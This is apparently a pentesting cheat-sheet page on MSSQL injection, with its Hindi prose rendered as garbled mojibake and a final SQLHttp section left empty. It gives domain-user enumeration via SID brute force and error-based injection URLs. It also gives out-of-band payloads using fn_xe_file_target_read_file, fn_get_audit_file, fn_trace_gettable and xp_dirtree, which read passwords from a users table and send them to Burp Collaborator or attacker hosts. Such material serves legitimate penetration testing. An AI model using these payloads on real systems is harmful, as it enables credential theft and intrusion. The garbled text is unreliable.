# MSSQL рдЗрдВрдЬреЗрдХреНрд╢рди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдВрдЪ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред

</details>

## Active Directory рдЬрд╛рдБрдЪ

рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк **MSSQL** рд╕рд░реНрд╡рд░ рдХреЗ рднреАрддрд░ **SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХреЗрдВ** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд MSSQL рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:

* **`SELECT DEFAULT_DOMAIN()`**: рд╡рд░реНрддрдорд╛рди рдбреЛрдореЗрди рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: рдпрджрд┐ рдЖрдк рдбреЛрдореЗрди рдХрд╛ рдирд╛рдо рдЬрд╛рдирддреЗ рд╣реИрдВ (_рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ DOMAIN_) рддреЛ рдпрд╣ рдлрдВрдХреНрд╢рди **рд╣реЗрдХреНрд╕ рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Administrator рдХрд╛ SID рд▓реМрдЯрд╛рдПрдЧрд╛**ред рдпрд╣ `0x01050000000[...]0000f401` рдХреА рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрдВрддрд┐рдо 4 рдмрд╛рдЗрдЯ** рдирдВрдмрд░ **500** рд╣реИрдВ, рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рдЖрдИрдбреА** рд╣реИрдВред\
рдЗрд╕ рдлрдВрдХреНрд╢рди рдХреА рдорджрдж рд╕реЗ рдЖрдк **рдбреЛрдореЗрди рдХреА рдЖрдИрдбреА рдХреЛ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ** (рдЕрдВрддрд┐рдо 4 рдмрд╛рдЗрдЯ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рд╕рднреА рдмрд╛рдЗрдЯреНрд╕)ред
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : рдЗрд╕ рдлрдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЖрдИрдбреА рдХреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдХреЛ рд▓реМрдЯрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдпрджрд┐ рдХреЛрдИ рд╣реЛ), рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **0000e803** рдмрдбрд╝реЗ рдЕрдВрдд рдореЗрдВ == **1000** рд╣реИ (рдЖрдорддреМрд░ рдкрд░ рдпрд╣ рдкрд╣рд▓реЗ рдирд┐рдпрдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХрд╛ рдЖрдИрдбреА рд╣реЛрддрд╛ рд╣реИ)ред рдлрд┐рд░ рдЖрдк рд╕реЛрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк 1000 рд╕реЗ 2000 рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрднрд╡рддрдГ рдбреЛрдореЗрди рдХреЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **рд╡реИрдХрд▓реНрдкрд┐рдХ рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд рд╡реЗрдХреНрдЯрд░реНрд╕**

рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдЖрдорддреМрд░ рдкрд░ `+AND+1=@@version--` рдФрд░ ┬лOR┬╗ рдСрдкрд░реЗрдЯрд░ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╡реЗрд░рд┐рдПрдВрдЯреНрд╕ рдЬреИрд╕реЗ рдирд┐рд░реНрдорд╛рдгреЛрдВ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рдХреЗ рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдЖрдорддреМрд░ рдкрд░ WAFs рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рд░реВрдк рдореЗрдВ, рд╡рд┐рд╢реЗрд╖ рдлрдВрдХреНрд╢рди рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЗ рд╕рд╛рде `%2b` рд╡рд░реНрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░реЗрдВ рдЬреЛ рдЦреЛрдЬреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛ рдкрд░ рдПрдХ рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рд╡рд░реНрддрди рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред

рдЗрд╕ рддрд░рд╣ рдХреЗ рдХреБрдЫ рдлрдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдг:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

рдлрдВрдХреНрд╢рди `USER_NAME()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** рд╕рд░реНрд╡рд░ рдкрд░ **`VIEW SERVER STATE`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди SQL Server рдореЗрдВ рдПрдХ рдЗрдВрдЯрд░рдирд▓ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕реЗ рдСрдбрд┐рдЯ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдПрдХ рд╡рд┐рд╢реЗрд╖ рддрд╛рд░реАрдЦ рд╕реАрдорд╛ рдХреЗ рдмреАрдЪ рдСрдбрд┐рдЯ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛рдмреЗрд╕ рдСрдбрд┐рдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдСрдбрд┐рдЯ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдПрдХ SQL Injection рд╣рдорд▓реЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдСрдбрд┐рдЯ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдкрдиреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд▓реЗ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рд╣рдореЗрдВ рдЕрдирдзрд┐рдХреГрдд рдбреЗрдЯрд╛рдмреЗрд╕ рдПрдХреНрд╕реЗрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ `sys.fn_get_audit_file` рдХреЗ рд╕рд╛рде рдПрдХ SQL Injection рдкреЗрдпрд▓реЛрдб рдкреНрд░рджрд╛рди рдХрд░рдиреА рд╣реЛрдЧреА рдЬреЛ рдСрдбрд┐рдЯ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде рдФрд░ рдлрд╝рд╛рдЗрд▓ рдирд╛рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдЧреАред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ рдЗрд╕ рдкреЗрдпрд▓реЛрдб рдХреЛ рдПрдХ SQL рдХреНрд╡реЗрд░реА рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕ рддрд░рд╣, рд╣рдо рдСрдбрд┐рдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдЕрдкрдиреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

рдпрд╣ рдлрд╝рдВрдХреНрд╢рди SQL Server рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ `fn_trace_gettable` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдЯреНрд░реЗрд╕ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдбреЗрдЯрд╛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ SQL Injection рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдРрд╕реА рд╕реНрдерд┐рддрд┐ рд╣реЛ рдЬрд╣рд╛рдВ рдПрдХ рдЕрдиреБрдорддрд┐ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡рд┐рдиреНрдпрд╛рд╕рд┐рдд SQL рдХреНрд╡реЗрд░реА рдХреЛ рдЕрдкрдиреА рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдорд▓рд╛рд╡рд░ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рдЕрдиреБрдорддрд┐ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдиреА рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ SQL Injection рдкреНрд░рд╢рдВрд╕рд╛ рдмрд┐рдВрджреБ рдЦреЛрдЬрдирд╛ рд╣реЛрдЧрд╛ рдЬрд╣рд╛рдВ рдПрдХ рдЕрдиреБрдорддрд┐ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `fn_trace_gettable` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреА рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ SQL рдХреНрд╡реЗрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `fn_trace_gettable` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╛рд╕ рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдорд▓рд╛рд╡рд░ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рдЕрдиреБрдорддрд┐ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдиреА рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

MSSQL рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдХреЙрд▓ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ `xp_dirtree` рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ, рдЬреЛ рдЕрдЬреАрдм рддрд░реАрдХреЗ рд╕реЗ Microsoft рджреНрд╡рд╛рд░рд╛ рдЕрдирджреЛрдХреНрдпреВрдореЗрдВрдЯреЗрдб рд╣реИ, рдЬрд┐рд╕рдХреЗ рдХрд╛рд░рдг рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЕрдиреНрдп рд▓реЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ [рджрд╕реНрддрд╛рд╡реЗрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)ред рдЗрд╕ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ [рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ](https://www.notsosecure.com/oob-exploitation-cheatsheet/) рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ [рдЖрдЙрдЯ рдСрдл рдмреИрдВрдб рдбреЗрдЯрд╛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) рдкреЛрд╕реНрдЯреНрд╕ рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рд╣реИрдВред

рдореВрд▓ рд░реВрдк рд╕реЗ,
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
рдПрдХ рдмрд╛рд░ рдлрд┐рд░ MySQL рдХреЗ `LOAD_FILE` рдХреА рддрд░рд╣, рдЖрдк `xp_dirtree` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЗрд╡рд▓ TCP рдкреЛрд░реНрдЯ 445 рдкрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

**PS:** рдпрд╣ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` рдкрд░ рдирд╣реАрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рдПрдХ `Windows Server 2016 Datacenter` рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рднреА **рдЕрдиреНрдп** рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░реНрд╕ рд╣реИрдВ рдЬреИрд╕реЗ [**`master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) рдпрд╛ **`xp_subdirs`** рдЬрд┐рдиреНрд╣реЗрдВ рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк **`xp_cmdshell`** рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХреБрдЫ рдХрд░рдХреЗ **SSRF** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдкреГрд╖реНрда рдореЗрдВ **рд╕рдВрдмрдВрдзрд┐рдд рдЦрдВрдб** рдкрдврд╝реЗрдВ:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд╛рд░реНрдп - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

